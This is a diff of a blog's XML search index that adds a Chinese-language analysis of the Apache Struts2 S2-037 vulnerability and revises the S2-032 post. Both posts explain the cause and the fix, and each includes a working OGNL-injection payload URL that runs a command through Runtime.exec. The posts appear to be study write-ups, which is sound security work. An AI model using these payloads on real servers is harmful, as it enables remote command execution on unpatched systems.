@@ -4,11 +4,30 @@
   
   
   <entry>
+    <title>struts2系列漏洞 S2-037</title>
+    <link href="/2020/07/29/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-037/"/>
+    <url>/2020/07/29/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-037/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><p>跟 S2-032 同原理，是 S2-033 的进化版本，不需要开启 DynamicMethodInvocation。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.28.1 版本的 struts2 + Tomcat 9。</p><p>用 maven 安装依赖：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;    &lt;artifactId&gt;struts2-rest-plugin&lt;/artifactId&gt;    &lt;version&gt;2.3.28.1&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>类似 S2-032 如果能想 mapping 中 set 一个未经过滤的字符串作为表达式，我们就可以实现命令执行。</p><p>阅读 RestActionMapper 类的 getMapping 函数，可以看到这里有很多 setMethod，比如：</p><pre><code class="java">String fullName = mapping.getName();// Only try something if the action name is specifiedif (fullName != null &amp;&amp; fullName.length() &gt; 0) {    // cut off any ;jsessionid= type appendix but allow the rails-like ;edit    int scPos = fullName.indexOf(&#39;;&#39;);    if (scPos &gt; -1 &amp;&amp; !&quot;edit&quot;.equals(fullName.substring(scPos + 1))) {        fullName = fullName.substring(0, scPos);    }    int lastSlashPos = fullName.lastIndexOf(&#39;/&#39;);    String id = null;    if (lastSlashPos &gt; -1) {        // fun trickery to parse &#39;actionName/id/methodName&#39; in the case of &#39;animals/dog/edit&#39;        int prevSlashPos = fullName.lastIndexOf(&#39;/&#39;, lastSlashPos - 1);        //WW-4589 do not overwrite explicit method name        if (prevSlashPos &gt; -1 &amp;&amp; mapping.getMethod() == null) {            mapping.setMethod(fullName.substring(lastSlashPos + 1));            fullName = fullName.substring(0, lastSlashPos);            lastSlashPos = prevSlashPos;        }        id = fullName.substring(lastSlashPos + 1);    }    ...}</code></pre><p>这些函数调用都没有对输入参数进行过滤。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在进入 getMapping 函数的 setMethod 之前，还有一个 dropExtension 的函数调用，用于处理 URI 后缀并返回：</p><pre><code class="java">protected String dropExtension(String name, ActionMapping mapping) {    if (extensions == null) {        return name;    }    for (String ext : extensions) {        if (&quot;&quot;.equals(ext)) {            // This should also handle cases such as /foo/bar-1.0/description. It is tricky to            // distinquish /foo/bar-1.0 but perhaps adding a numeric check in the future could            // work            int index = name.lastIndexOf(&#39;.&#39;);            if (index == -1 || name.indexOf(&#39;/&#39;, index) &gt;= 0) {                return name;            }        } else {            String extension = &quot;.&quot; + ext;            if (name.endsWith(extension)) {                name = name.substring(0, name.length() - extension.length());                mapping.setExtension(ext);                return name;            }        }    }    return null;}</code></pre><p>所以 S2-032 的 payload 需要稍加修改，而且 2.3.28.1 版本的 OGNL 禁止了逗号和括号执行多条表达式，所以要换个办法，payload：</p><pre><code>http://localhost:8080/login/method/((%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)-(@java.lang.Runtime@getRuntime().exec(%23parameters.c%5b0%5d))).toString.xhtml?c=calc</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>2.3.29 的修复，DefaultActionInvocation 类的 invokeAction 方法里解析表达式的函数改变了，从 getValue：</p><pre><code class="java">methodResult = ognlUtil.getValue(methodName + &quot;()&quot;, getStack().getContext(), action);</code></pre><p>变成了 callMethod：</p><pre><code class="java">methodResult = ognlUtil.callMethod(methodName + &quot;()&quot;, getStack().getContext(), action);</code></pre><p>而 callMethod 中调用的是 compileAndExecuteMethod，会有 isSimpleMethod 函数的校验：</p><pre><code class="java">private boolean isSimpleMethod(Object tree, Map&lt;String, Object&gt; context) throws OgnlException {    if (tree instanceof SimpleNode) {        SimpleNode node = (SimpleNode) tree;        OgnlContext ognlContext = null;        if (context!=null &amp;&amp; context instanceof OgnlContext) {            ognlContext = (OgnlContext) context;        }        return node.isSimpleMethod(ognlContext) &amp;&amp; !node.isChain(ognlContext);    }    return false;}</code></pre><p>用于检查调用的方法是否是单独的方法调用。</p><hr><p>参考文章：</p><p><a href="http://blog.nsfocus.net/struts2-s2-037-vulnerability-analysis/" target="_blank" rel="noopener">http://blog.nsfocus.net/struts2-s2-037-vulnerability-analysis/</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>struts2系列漏洞 S2-032</title>
     <link href="/2020/07/28/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-032/"/>
     <url>/2020/07/28/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-032/</url>
     
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.28 版本的 struts2 + Tomcat 9。</p><p>修改 struts.xml，打开动态方法调用：</p><pre><code class="xml">&lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;true&quot; /&gt;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据<a href="https://cwiki.apache.org/confluence/display/WW/S2-032" target="_blank" rel="noopener">官方通告</a>，可以看出漏洞原因是在动态方法调用开启的情况下，会将 method: 前缀的参数作为表达式来执行，我们先看看 method: 前缀参数的 put 方法：</p><pre><code class="java">put(METHOD_PREFIX, new ParameterAction() {    public void execute(String key, ActionMapping mapping) {        if (allowDynamicMethodCalls) {            mapping.setMethod(key.substring(METHOD_PREFIX.length()));        }    }});</code></pre><p>在 DynamicMethodInvocation 开启的情况下，会不经过滤将 method: 前缀参数放入 mapping 中。在 Dispatcher 类的 serviceAction 函数用其创建代理之后，会执行到 DefaultActionInvocation 类的 invokeAction 函数中：</p><pre><code class="java">protected String invokeAction(Object action, ActionConfig actionConfig) throws Exception {    String methodName = proxy.getMethod();    if (LOG.isDebugEnabled()) {        LOG.debug(&quot;Executing action method = #0&quot;, methodName);    }    String timerKey = &quot;invokeAction: &quot; + proxy.getActionName();    try {        UtilTimerStack.push(timerKey);        Object methodResult;        try {            methodResult = ognlUtil.getValue(methodName + &quot;()&quot;, getStack().getContext(), action);        }         ...    }    ...}</code></pre><p>将参数值作为表达式解析。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>因为 2.3.20 版本的修复中禁止了 new 和反射，所以通过修改用于安全检测的 _memberAccess 属性，将之变为实现了 memberAccess 接口的另一个类 DefaultMemberAccess，它的 isAccessible 函数如下：</p><pre><code class="java">public boolean isAccessible(Map context, Object target, Member member, String propertyName){    int         modifiers = member.getModifiers();    boolean     result = Modifier.isPublic(modifiers);    if (!result) {        if (Modifier.isPrivate(modifiers)) {            result = getAllowPrivateAccess();        } else {            if (Modifier.isProtected(modifiers)) {                result = getAllowProtectedAccess();            } else {                result = getAllowPackageProtectedAccess();            }        }    }    return result;}</code></pre><p>可以看到，对 public 函数调用没有任何限制，而 OgnlContext 中恰好有这么一个静态属性：</p><pre><code class="java">public static final MemberAccess DEFAULT_MEMBER_ACCESS = new DefaultMemberAccess(false);</code></pre><p>payload 如下：</p><pre><code>http://localhost:8080/login.action?method:(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.c%5b0%5d)).toString&amp;a=xwork.MethodAccessor.denyMethodExecution&amp;b=allowStaticMethodAccess&amp;c=calc</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>给 method: 前缀的参数值加上了前面 actionName 的过滤。</p><hr><p>参考文章：</p><p><a href="https://www.cnblogs.com/mrchang/p/6501428.html" target="_blank" rel="noopener">https://www.cnblogs.com/mrchang/p/6501428.html</a></p>]]></content>
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.28 版本的 struts2 + Tomcat 9。</p><p>修改 struts.xml，打开动态方法调用：</p><pre><code class="xml">&lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;true&quot; /&gt;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据<a href="https://cwiki.apache.org/confluence/display/WW/S2-032" target="_blank" rel="noopener">官方通告</a>，可以看出漏洞原因是在动态方法调用开启的情况下，会将 method: 前缀的参数作为表达式来执行，我们先看看 method: 前缀参数的 put 方法：</p><pre><code class="java">put(METHOD_PREFIX, new ParameterAction() {    public void execute(String key, ActionMapping mapping) {        if (allowDynamicMethodCalls) {            mapping.setMethod(key.substring(METHOD_PREFIX.length()));        }    }});</code></pre><p>在 DynamicMethodInvocation 开启的情况下，会不经过滤将 method: 前缀参数放入 mapping 中。在 Dispatcher 类的 serviceAction 函数用其创建代理之后，会执行到 DefaultActionInvocation 类的 invokeAction 函数中：</p><pre><code class="java">protected String invokeAction(Object action, ActionConfig actionConfig) throws Exception {    String methodName = proxy.getMethod();    if (LOG.isDebugEnabled()) {        LOG.debug(&quot;Executing action method = #0&quot;, methodName);    }    String timerKey = &quot;invokeAction: &quot; + proxy.getActionName();    try {        UtilTimerStack.push(timerKey);        Object methodResult;        try {            methodResult = ognlUtil.getValue(methodName + &quot;()&quot;, getStack().getContext(), action);        }         ...    }    ...}</code></pre><p>将参数值作为表达式解析。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>因为 2.3.20 版本的修复中禁止了 new 和反射，所以通过修改用于安全检测的 _memberAccess 属性，将之变为实现了 memberAccess 接口的另一个类 DefaultMemberAccess，它的 isAccessible 函数如下：</p><pre><code class="java">public boolean isAccessible(Map context, Object target, Member member, String propertyName){    int         modifiers = member.getModifiers();    boolean     result = Modifier.isPublic(modifiers);    if (!result) {        if (Modifier.isPrivate(modifiers)) {            result = getAllowPrivateAccess();        } else {            if (Modifier.isProtected(modifiers)) {                result = getAllowProtectedAccess();            } else {                result = getAllowPackageProtectedAccess();            }        }    }    return result;}</code></pre><p>可以看到，对 public 函数调用没有任何限制，而 OgnlContext 中恰好有这么一个静态属性：</p><pre><code class="java">public static final MemberAccess DEFAULT_MEMBER_ACCESS = new DefaultMemberAccess(false);</code></pre><p>payload 如下：</p><pre><code>http://localhost:8080/login.action?method:(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.c%5b0%5d)).toString&amp;c=calc</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>给 method: 前缀的参数值加上了前面 actionName 的过滤。</p><hr><p>参考文章：</p><p><a href="https://www.cnblogs.com/mrchang/p/6501428.html" target="_blank" rel="noopener">https://www.cnblogs.com/mrchang/p/6501428.html</a></p>]]></content>
     
     
     
@@ -552,9 +571,9 @@
       
       <tag>Web</tag>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
@@ -687,9 +706,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -765,9 +784,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
+      
+      <tag>Crypto</tag>
       
       <tag>Pwn</tag>
       
@@ -788,9 +807,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -809,9 +828,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -830,9 +849,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -893,9 +912,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
+      
+      <tag>Crypto</tag>
       
       <tag>Pwn</tag>
       
@@ -916,9 +935,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -937,9 +956,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -958,9 +977,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -979,9 +998,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -1061,9 +1080,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1122,9 +1141,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -1145,9 +1164,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1166,9 +1185,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1206,9 +1225,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1227,9 +1246,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -1267,9 +1286,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -1288,9 +1307,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1429,9 +1448,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
@@ -1471,9 +1490,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
@@ -1492,9 +1511,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
